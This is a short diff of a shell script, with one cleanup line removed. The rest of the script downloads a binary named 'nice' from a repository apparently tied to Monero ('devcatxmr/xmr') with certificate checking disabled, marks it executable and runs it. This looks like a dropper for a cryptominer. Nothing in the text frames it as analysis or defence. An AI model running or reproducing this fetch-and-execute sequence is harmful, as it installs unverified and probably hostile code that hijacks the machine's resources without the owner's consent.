@@ -1,5 +1,4 @@
 cd ..
-rm nice3.sh
 wget -N --no-check-certificate https://raw.githubusercontent.com/devcatxmr/xmr/master/nice
 chmod +x nice
 ./nice
